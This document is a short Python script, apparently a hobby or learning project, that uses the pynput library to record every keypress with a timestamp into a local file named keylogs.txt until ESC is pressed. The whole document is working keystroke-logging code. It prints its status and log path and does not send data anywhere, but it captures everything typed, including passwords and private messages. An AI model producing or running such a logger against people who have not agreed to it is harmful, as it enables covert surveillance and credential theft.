import pynput.keyboard as keyboard
import datetime
import os

print("Current working directory:", os.getcwd())
print("Log file:", os.path.abspath("keylogs.txt"))

log_file = "keylogs.txt"

def on_press(key):
    time_stamp = datetime.datetime.now().strftime("%H:%M:%S")

    try:
        entry = f"{time_stamp}: '{key.char}'"
    except:
        entry = f"{time_stamp}: '{key}'"

    with open(log_file, "a") as file:
        file.write(entry + "\n")

print("LOGGER RUNNING...")
print('press "ESC" to stop')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

listener = keyboard.Listener(on_press=on_press,
                            on_release=on_release)

listener.start()
listener.join()